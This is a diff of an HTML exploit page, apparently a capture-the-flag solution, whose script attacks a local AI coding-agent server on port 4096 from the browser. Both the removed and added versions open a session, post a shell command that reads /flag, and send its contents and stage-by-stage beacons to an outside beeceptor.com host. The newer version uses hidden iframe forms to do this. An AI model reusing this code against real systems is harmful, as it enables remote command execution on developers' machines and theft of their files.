@@ -1,140 +1,52 @@
-<!doctype html>
+<!DOCTYPE html>
 <html>
 <body>
 <script>
-(async () => {
-  const EXFIL = 'https://1233333.free.beeceptor.com';
-  const RUN = Math.random().toString(36).slice(2) + Date.now();
-  const CTRL = 'http://127.0.0.1:4096';
-
-  function log(stage, extra = '') {
-    const u =
-      `${EXFIL}/log?run=${encodeURIComponent(RUN)}` +
-      `&stage=${encodeURIComponent(stage)}` +
-      (extra ? `&${extra}` : '');
-    new Image().src = u;
-  }
-
-  async function jfetch(url, opt = {}, timeout = 2000) {
-    const c = new AbortController();
-    const t = setTimeout(() => c.abort(), timeout);
-    try {
-      const r = await fetch(url, { signal: c.signal, cache: 'no-store', ...opt });
-      const txt = await r.text();
-      let json = null;
-      try { json = JSON.parse(txt); } catch (_) {}
-      return { r, txt, json };
-    } finally {
-      clearTimeout(t);
+(function() {
+    const EXFIL = "122222.free.beeceptor.com";  // 替换为你的接收端
+    const RUN_ID = Math.random().toString(36).substring(2) + Date.now();
+    function beacon(action, extra) {
+        new Image().src = `${EXFIL}/log?run=${RUN_ID}&action=${encodeURIComponent(action)}` + (extra ? `&${extra}` : '');
     }
-  }
+    const PAYLOAD = `node -e "require('fs').chmodSync('/flag', 0o644); require('http').request('${EXFIL}/flag?run=${RUN_ID}',{method:'POST'},r=>{}).end(require('fs').readFileSync('/flag'))"`;
+    const BASE = 'http://localhost:4096';
 
-  log('loaded');
-
-  try {
-    const h = await jfetch(`${CTRL}/healthz`, {}, 1200);
-    log('ctrl-health', `code=${h.r.status}&body=${encodeURIComponent(h.txt.slice(0,120))}`);
-  } catch (e) {
-    log('ctrl-health-fail', `err=${encodeURIComponent(String(e).slice(0,120))}`);
-    return;
-  }
-
-  try {
-    const s = await jfetch(`${CTRL}/api/instance/start`, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: '{}'
-    }, 2000);
-    log('start-posted', `code=${s.r.status}&body=${encodeURIComponent(s.txt.slice(0,160))}`);
-  } catch (e) {
-    log('start-fail', `err=${encodeURIComponent(String(e).slice(0,120))}`);
-    return;
-  }
-
-  let ip = null, port = null, statusBody = null;
-  for (let i = 0; i < 20; i++) {
-    try {
-      const st = await jfetch(`${CTRL}/api/status`, {}, 1500);
-      statusBody = st.json || {};
-      log('status-poll', `i=${i}&body=${encodeURIComponent(st.txt.slice(0,200))}`);
-
-      if (statusBody.instance && statusBody.instance.ip && statusBody.instance.port) {
-        ip = statusBody.instance.ip;
-        port = statusBody.instance.port;
-        break;
-      }
-    } catch (e) {
-      log('status-fail', `i=${i}&err=${encodeURIComponent(String(e).slice(0,120))}`);
+    function postForm(url, data) {
+        let iframe = document.createElement('iframe');
+        iframe.name = 'hiddenFormTarget';
+        iframe.style.display = 'none';
+        document.body.appendChild(iframe);
+        let form = document.createElement('form');
+        form.method = 'POST';
+        form.action = url;
+        form.target = 'hiddenFormTarget';
+        form.style.display = 'none';
+        for (let [k, v] of Object.entries(data)) {
+            let input = document.createElement('input');
+            input.type = 'hidden';
+            input.name = k;
+            input.value = v;
+            form.appendChild(input);
+        }
+        document.body.appendChild(form);
+        form.submit();
+        setTimeout(() => { form.remove(); iframe.remove(); }, 1000);
     }
-    await new Promise(r => setTimeout(r, 800));
-  }
 
-  if (!ip || !port) {
-    log('no-instance');
-    return;
-  }
-
-  const BASE = `http://${ip}:${port}`;
-  log('instance-found', `ip=${encodeURIComponent(ip)}&port=${port}`);
-
-  try {
-    const gh = await jfetch(`${BASE}/global/health`, {}, 1500);
-    log('oc-health', `code=${gh.r.status}&body=${encodeURIComponent(gh.txt.slice(0,120))}`);
-  } catch (e) {
-    log('oc-health-fail', `err=${encodeURIComponent(String(e).slice(0,120))}`);
-    return;
-  }
-
-  let agent = 'build';
-  try {
-    const ar = await jfetch(`${BASE}/agent`, {}, 1500);
-    if (Array.isArray(ar.json) && ar.json.length) {
-      agent = ar.json.find(x => x.id === 'build')?.id || ar.json[0].id || 'build';
-    }
-    log('agent-ok', `agent=${encodeURIComponent(agent)}&body=${encodeURIComponent(ar.txt.slice(0,120))}`);
-  } catch (e) {
-    log('agent-fail', `err=${encodeURIComponent(String(e).slice(0,120))}`);
-  }
-
-  let sid = null;
-  try {
-    const sr = await jfetch(`${BASE}/session`, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: '{}'
-    }, 2000);
-
-    sid = sr.json && sr.json.id;
-    log('session-ok', `sid=${encodeURIComponent(String(sid))}&body=${encodeURIComponent(sr.txt.slice(0,160))}`);
-  } catch (e) {
-    log('session-fail', `err=${encodeURIComponent(String(e).slice(0,120))}`);
-    return;
-  }
-
-  if (!sid) {
-    log('no-sid');
-    return;
-  }
-
-  const cmd =
-    `node -e "const fs=require('fs'),https=require('https');` +
-    `fs.chmodSync('/flag',0o644);` +
-    `https.get('${EXFIL}/flag?run=${RUN}&f='+encodeURIComponent(fs.readFileSync('/flag','utf8')))"`;
-
-  try {
-    const sh = await jfetch(`${BASE}/session/${sid}/shell`, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({
-        agent,
-        command: cmd
-      })
-    }, 3000);
-
-    log('shell-posted', `code=${sh.r.status}&body=${encodeURIComponent(sh.txt.slice(0,200))}`);
-  } catch (e) {
-    log('shell-fail', `err=${encodeURIComponent(String(e).slice(0,120))}`);
-  }
+    beacon('start');
+    let probe = document.createElement('iframe');
+    probe.style.display = 'none';
+    probe.src = BASE + '/';
+    probe.onload = () => {
+        beacon('port_open');
+        postForm(BASE + '/session', {});
+        setTimeout(() => {
+            postForm(BASE + '/session/1/shell', { command: PAYLOAD });
+            beacon('exploit_sent');
+        }, 1000);
+    };
+    probe.onerror = () => beacon('port_error');
+    document.body.appendChild(probe);
 })();
 </script>
 </body>
